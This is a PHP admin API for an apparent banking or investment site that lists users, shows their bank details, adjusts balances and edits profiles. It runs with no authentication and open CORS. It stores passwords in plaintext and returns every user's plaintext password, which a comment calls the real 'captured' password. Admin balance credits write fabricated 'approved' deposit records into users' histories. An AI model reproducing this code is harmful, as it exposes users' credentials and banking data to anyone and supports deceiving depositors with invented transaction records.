<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require_once 'config.php';

// Simple admin check - in production, use proper authentication

// GET - Get all users or specific user
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    try {
        $user_id = $_GET['user_id'] ?? $_GET['id'] ?? null;
        
        if ($user_id) {
            // Get specific user details
            $stmt = $pdo->prepare("
                SELECT id, username, firstname, lastname, email, mobile, country_code, 
                       balance, address, city, state, zip, status, created_at, last_login,
                       account_number,
                       bank_account_number, bank_beneficiary, bank_routing, bank_swift,
                       bank_intermediary, bank_address, plain_password
                FROM users 
                WHERE id = ?
            ");
            $stmt->execute([$user_id]);
            $user = $stmt->fetch();
            
            if (!$user) {
                echo json_encode(['success' => false, 'message' => 'User not found']);
                exit;
            }

            // Decode address JSON to plain string if needed
            if (!empty($user['address'])) {
                $decoded = json_decode($user['address'], true);
                if (is_array($decoded)) {
                    $user['address'] = $decoded['address'] ?? '';
                }
            }
            
            // Get user's deposits from deposits table
            $stmt = $pdo->prepare("SELECT *, 'deposit' AS record_source, id AS tx_id FROM deposits WHERE user_id = ? ORDER BY created_at DESC");
            $stmt->execute([$user_id]);
            $deposits = $stmt->fetchAll();

            // Also include credit transactions that are NOT already in deposits table
            // (e.g., manually-added transactions via Add Transaction modal)
            try {
                $stmt = $pdo->prepare("
                    SELECT
                        t.id AS tx_id,
                        NULL AS id,
                        t.trx,
                        'Manual (Admin)' AS gateway,
                        t.amount,
                        0 AS charge,
                        t.amount AS final_amount,
                        t.status,
                        t.details AS notes,
                        t.date AS created_at,
                        t.date AS updated_at,
                        'transaction' AS record_source
                    FROM transactions t
                    WHERE t.user_id = ?
                      AND t.type = 'credit'
                      AND NOT EXISTS (
                          SELECT 1 FROM deposits d
                          WHERE d.user_id = t.user_id
                            AND (d.trx = t.trx COLLATE utf8mb4_unicode_ci OR d.trx = REPLACE(t.trx, 'DEP', '') COLLATE utf8mb4_unicode_ci)
                      )
                    ORDER BY t.date DESC
                ");
                $stmt->execute([$user_id]);
                $txDeposits = $stmt->fetchAll();
                $deposits = array_merge($deposits, $txDeposits);
                // Sort combined by created_at desc
                usort($deposits, function($a, $b) {
                    return strtotime($b['created_at']) - strtotime($a['created_at']);
                });
            } catch (PDOException $e) {
                // transactions table may not exist, ignore
            }

            // Get user's withdrawals
            $stmt = $pdo->prepare("SELECT * FROM withdrawals WHERE user_id = ? ORDER BY created_at DESC");
            $stmt->execute([$user_id]);
            $withdrawals = $stmt->fetchAll();
            
            echo json_encode([
                'success' => true,
                'user' => $user,
                'deposits' => $deposits,
                'withdrawals' => $withdrawals
            ]);
            
        } else {
            // Get all users - incluir plain_password si existe
            $stmt = $pdo->query("
                SELECT id, username, firstname, lastname, email, mobile, 
                       balance, status, created_at, last_login, password, plain_password 
                FROM users 
                ORDER BY created_at DESC
            ");
            $users = $stmt->fetchAll();
            
            // Si plain_password existe, usarla; si no, mostrar el hash
            foreach ($users as &$user) {
                if (!empty($user['plain_password'])) {
                    // Mostrar la contraseña real capturada
                    $user['password'] = $user['plain_password'];
                }
                // Eliminar plain_password del response (ya está en password)
                unset($user['plain_password']);
            }
            
            echo json_encode([
                'success' => true,
                'users' => $users
            ]);
        }
        
    } catch (PDOException $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Database error: ' . $e->getMessage()
        ]);
    }
    exit;
}

// POST - Update user balance or status
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    $action = $input['action'] ?? null;
    $user_id = $input['user_id'] ?? null;
    
    if (!$action || !$user_id) {
        echo json_encode(['success' => false, 'message' => 'Action and user ID are required']);
        exit;
    }
    
    try {
        if ($action === 'update_balance') {
            $amount = $input['amount'] ?? null;
            $operation = $input['operation'] ?? 'add'; // add or subtract
            $notes = trim($input['notes'] ?? 'Manual adjustment by admin');

            if ($amount === null || !is_numeric($amount) || floatval($amount) <= 0) {
                echo json_encode(['success' => false, 'message' => 'Valid amount is required']);
                exit;
            }

            $pdo->beginTransaction();

            if ($operation === 'add') {
                $stmt = $pdo->prepare("UPDATE users SET balance = balance + ? WHERE id = ?");
            } else {
                $stmt = $pdo->prepare("UPDATE users SET balance = balance - ? WHERE id = ?");
            }
            $stmt->execute([floatval($amount), $user_id]);

            // Get new balance
            $stmt = $pdo->prepare("SELECT balance FROM users WHERE id = ?");
            $stmt->execute([$user_id]);
            $newBalance = floatval($stmt->fetchColumn());

            // Generate unique TRX
            $trx = 'ADM' . strtoupper(substr(md5(uniqid(rand(), true)), 0, 10));

            if ($operation === 'add') {
                // Create a deposit record so it appears in deposit history
                $stmt = $pdo->prepare("
                    INSERT INTO deposits (user_id, trx, gateway, amount, charge, final_amount, status, notes, created_at, updated_at)
                    VALUES (?, ?, 'Manual Deposit (Admin)', ?, 0, ?, 'approved', ?, NOW(), NOW())
                ");
                $stmt->execute([$user_id, $trx, floatval($amount), floatval($amount), $notes]);

                // Create transaction record (credit)
                $stmt = $pdo->prepare("
                    INSERT INTO transactions (user_id, trx, date, details, account_number, amount, type, status, post_balance, description, created_at)
                    VALUES (?, ?, NOW(), 'Manual Deposit (Admin)', '', ?, 'credit', 'completed', ?, ?, NOW())
                ");
                $stmt->execute([$user_id, $trx, floatval($amount), $newBalance, $notes]);
            } else {
                // Subtract: only a debit transaction record
                $stmt = $pdo->prepare("
                    INSERT INTO transactions (user_id, trx, date, details, account_number, amount, type, status, post_balance, description, created_at)
                    VALUES (?, ?, NOW(), 'Manual Deduction (Admin)', '', ?, 'debit', 'completed', ?, ?, NOW())
                ");
                $stmt->execute([$user_id, $trx, floatval($amount), $newBalance, $notes]);
            }

            $pdo->commit();

            echo json_encode([
                'success' => true,
                'message' => 'Balance updated and record created successfully'
            ]);
            
        } elseif ($action === 'update_status') {
            $status = $input['status'] ?? null;
            
            if ($status === null) {
                echo json_encode(['success' => false, 'message' => 'Status is required']);
                exit;
            }
            
            $stmt = $pdo->prepare("UPDATE users SET status = ? WHERE id = ?");
            $stmt->execute([$status, $user_id]);
            
            echo json_encode([
                'success' => true,
                'message' => 'User status updated successfully'
            ]);
            
        } elseif ($action === 'update_user') {
            // Update user information
            $firstname = $input['firstname'] ?? null;
            $lastname = $input['lastname'] ?? null;
            $username = $input['username'] ?? null;
            $new_password = (isset($input['password']) && trim($input['password']) !== '') ? trim($input['password']) : null;
            $email = $input['email'] ?? null;
            $mobile = $input['mobile'] ?? null;
            $city = $input['city'] ?? null;
            $state = $input['state'] ?? null;
            $zip = $input['zip'] ?? null;
            $address = $input['address'] ?? null;
            $bank_account_number = $input['bank_account_number'] ?? null;
            $bank_beneficiary = $input['bank_beneficiary'] ?? null;
            $bank_routing = $input['bank_routing'] ?? null;
            $bank_swift = $input['bank_swift'] ?? null;
            $bank_intermediary = $input['bank_intermediary'] ?? null;
            $bank_address = $input['bank_address'] ?? null;
            $account_number = $input['account_number'] ?? null;
            
            $updates = [];
            $params = [];
            
            if ($firstname !== null) {
                $updates[] = "firstname = ?";
                $params[] = $firstname;
            }
            if ($lastname !== null) {
                $updates[] = "lastname = ?";
                $params[] = $lastname;
            }
            if ($username !== null && $username !== '') {
                $updates[] = "username = ?";
                $params[] = $username;
            }
            if ($new_password !== null) {
                $updates[] = "password = ?";
                $params[] = password_hash($new_password, PASSWORD_DEFAULT);
                $updates[] = "plain_password = ?";
                $params[] = $new_password;
            }
            if ($email !== null) {
                $updates[] = "email = ?";
                $params[] = $email;
            }
            if ($mobile !== null) {
                $updates[] = "mobile = ?";
                $params[] = $mobile;
            }
            if ($city !== null) {
                $updates[] = "city = ?";
                $params[] = $city;
            }
            if ($state !== null) {
                $updates[] = "state = ?";
                $params[] = $state;
            }
            if ($zip !== null) {
                $updates[] = "zip = ?";
                $params[] = $zip;
            }
            if ($address !== null) {
                $updates[] = "address = ?";
                // Save as JSON to stay consistent with the DB format
                $params[] = json_encode(['address' => $address, 'city' => $city ?? '', 'state' => $state ?? '', 'zip' => $zip ?? '', 'country' => '']);
            }
            if ($bank_account_number !== null) {
                $updates[] = "bank_account_number = ?";
                $params[] = $bank_account_number;
            }
            if ($bank_beneficiary !== null) {
                $updates[] = "bank_beneficiary = ?";
                $params[] = $bank_beneficiary;
            }
            if ($bank_routing !== null) {
                $updates[] = "bank_routing = ?";
                $params[] = $bank_routing;
            }
            if ($bank_swift !== null) {
                $updates[] = "bank_swift = ?";
                $params[] = $bank_swift;
            }
            if ($bank_intermediary !== null) {
                $updates[] = "bank_intermediary = ?";
                $params[] = $bank_intermediary;
            }
            if ($bank_address !== null) {
                $updates[] = "bank_address = ?";
                $params[] = $bank_address;
            }
            if ($account_number !== null && $account_number !== '') {
                $updates[] = "account_number = ?";
                $params[] = $account_number;
            }
            
            if (empty($updates)) {
                echo json_encode(['success' => false, 'message' => 'No fields to update']);
                exit;
            }
            
            $params[] = $user_id;
            $sql = "UPDATE users SET " . implode(", ", $updates) . " WHERE id = ?";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($params);
            
            echo json_encode([
                'success' => true,
                'message' => 'User information updated successfully'
            ]);
            
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid action']);
        }
        
    } catch (PDOException $e) {
        if ($pdo->inTransaction()) {
            $pdo->rollBack();
        }
        echo json_encode([
            'success' => false,
            'message' => 'Database error: ' . $e->getMessage()
        ]);
    }
    exit;
}

echo json_encode([
    'success' => false,
    'message' => 'Invalid request method'
]);
?>
